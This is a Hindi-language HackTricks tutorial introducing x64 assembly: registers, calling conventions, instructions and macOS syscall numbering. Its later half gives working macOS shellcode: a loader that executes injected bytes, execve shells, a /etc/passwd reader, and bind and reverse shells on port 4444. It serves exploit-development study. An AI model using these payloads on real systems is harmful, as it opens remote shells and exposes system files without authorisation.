# x64 का परिचय

{{#include ../../../banners/hacktricks-training.md}}

## **x64 का परिचय**

x64, जिसे x86-64 के नाम से भी जाना जाता है, एक 64-bit processor architecture है जिसका उपयोग मुख्य रूप से desktop और server computing में किया जाता है। इसकी उत्पत्ति Intel द्वारा निर्मित x86 architecture से हुई और बाद में AMD ने इसे AMD64 नाम से अपनाया। आज यह personal computers और servers में सबसे अधिक प्रचलित architecture है।

### **Registers**

x64, x86 architecture का विस्तार करता है और इसमें **16 general-purpose registers** होते हैं, जिन्हें `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` और `r8` से `r15` तक नाम दिया गया है। इनमें से प्रत्येक **64-bit** (8-byte) value store कर सकता है। Compatibility और विशिष्ट कार्यों के लिए इन registers में 32-bit, 16-bit और 8-bit sub-registers भी होते हैं।

1. **`rax`** - परंपरागत रूप से functions से प्राप्त **return values** के लिए उपयोग किया जाता है।
2. **`rbx`** - memory operations के लिए अक्सर **base register** के रूप में उपयोग किया जाता है।
3. **`rcx`** - आमतौर पर **loop counters** के लिए उपयोग किया जाता है।
4. **`rdx`** - extended arithmetic operations सहित विभिन्न कार्यों में उपयोग किया जाता है।
5. **`rbp`** - stack frame के लिए **base pointer**।
6. **`rsp`** - **stack pointer**, जो stack के शीर्ष का पता रखता है।
7. **`rsi`** और **`rdi`** - string/memory operations में **source** और **destination** indexes के लिए उपयोग किए जाते हैं।
8. **`r8`** से **`r15`** - x64 में जोड़े गए अतिरिक्त general-purpose registers।

### **Calling Convention**

x64 calling convention अलग-अलग operating systems में भिन्न होता है। उदाहरण के लिए:

- **Windows**: पहले **चार parameters** registers **`rcx`**, **`rdx`**, **`r8`**, और **`r9`** में पास किए जाते हैं। अतिरिक्त parameters को stack पर push किया जाता है। Return value **`rax`** में होती है।
- **System V (आमतौर पर UNIX-like systems में उपयोग किया जाता है)**: पहले **छह integer या pointer parameters** registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, और **`r9`** में पास किए जाते हैं। Return value भी **`rax`** में होती है।

यदि function में छह से अधिक inputs हों, तो **बाकी को stack पर पास किया जाएगा**। **RSP**, यानी stack pointer, **16 bytes aligned** होना चाहिए। इसका अर्थ है कि call होने से पहले जिस address की ओर यह point करता है, वह 16 से divisible होना चाहिए। इसका मतलब है कि सामान्यतः function call करने से पहले हमें अपने shellcode में यह सुनिश्चित करना होगा कि RSP सही रूप से aligned हो। हालांकि, व्यवहार में system calls कई बार इस requirement के पूरी न होने पर भी काम करते हैं।

### Calling Convention in Swift

Swift का अपना **calling convention** है, जिसे [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) पर पाया जा सकता है।

### **Common Instructions**

x64 instructions का एक समृद्ध set है, जो पुराने x86 instructions के साथ compatibility बनाए रखते हुए नए instructions भी प्रस्तुत करता है।

- **`mov`**: किसी **register** या **memory location** से value को दूसरे स्थान पर **move** करता है।
- उदाहरण: `mov rax, rbx` — `rbx` की value को `rax` में move करता है।
- **`push`** और **`pop`**: values को **stack** पर push या stack से pop करते हैं।
- उदाहरण: `push rax` — `rax` की value को stack पर push करता है।
- उदाहरण: `pop rax` — stack की top value को stack से `rax` में pop करता है।
- **`add`** और **`sub`**: **Addition** और **subtraction** operations।
- उदाहरण: `add rax, rcx` — `rax` और `rcx` की values को जोड़कर result को `rax` में store करता है।
- **`mul`** और **`div`**: **Multiplication** और **division** operations। ध्यान दें: operands के उपयोग के संबंध में इनका behavior विशिष्ट होता है।
- **`call`** और **`ret`**: **functions को call करने** और **उनसे return करने** के लिए उपयोग किए जाते हैं।
- **`int`**: software **interrupt** trigger करने के लिए उपयोग किया जाता है। उदाहरण के लिए, 32-bit x86 Linux में system calls के लिए `int 0x80` का उपयोग किया जाता था।
- **`cmp`**: दो values की **compare** करता है और result के आधार पर CPU के flags set करता है।
- उदाहरण: `cmp rax, rdx` — `rax` की तुलना `rdx` से करता है।
- **`je`, `jne`, `jl`, `jge`, ...**: **Conditional jump** instructions, जो पिछले `cmp` या test के results के आधार पर control flow बदलते हैं।
- उदाहरण: `cmp rax, rdx` instruction के बाद, `je label` — यदि `rax`, `rdx` के बराबर है, तो `label` पर jump करता है।
- **`syscall`**: कुछ x64 systems (जैसे modern Unix) में **system calls** के लिए उपयोग किया जाता है।
- **`sysenter`**: कुछ platforms पर optimized **system call** instruction।

### **Function Prologue**

1. **पुराने base pointer को push करें**: `push rbp` (caller के base pointer को save करता है)
2. **वर्तमान stack pointer को base pointer में move करें**: `mov rbp, rsp` (वर्तमान function के लिए नया base pointer set करता है)
3. **Local variables के लिए stack पर space allocate करें**: `sub rsp, <size>` (जहाँ `<size>` आवश्यक bytes की संख्या है)

### **Function Epilogue**

1. **वर्तमान base pointer को stack pointer में move करें**: `mov rsp, rbp` (local variables को deallocate करता है)
2. **पुराने base pointer को stack से pop करें**: `pop rbp` (caller के base pointer को restore करता है)
3. **Return करें**: `ret` (control को caller को वापस देता है)

## macOS

### syscalls

syscalls की अलग-अलग classes होती हैं, जिन्हें आप [**यहाँ पा सकते हैं**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
फिर, आप प्रत्येक syscall number [**इस URL में**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)** पा सकते हैं:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
इसलिए **Unix/BSD class** से `open` syscall (**5**) को call करने के लिए आपको इसे जोड़ना होगा: `0x2000000`

इसलिए open को call करने के लिए syscall number `0x2000005` होगा

### Shellcodes

Compile करने के लिए:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Bytes निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>shellcode का परीक्षण करने के लिए C code</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**यहाँ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) से लिया गया और समझाया गया है।<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### cat से पढ़ें

लक्ष्य `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को execute करना है, इसलिए दूसरा argument (x1) params की एक array है (memory में इसका अर्थ addresses का stack है)।
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh के साथ command invoke करें
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) से **port 4444** में Bind shell<sup>[[2]](#references)</sup>।
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) से Reverse shell। **127.0.0.1:4444** पर Reverse shell<sup>[[3]](#references)</sup>】【。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## संदर्भ

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
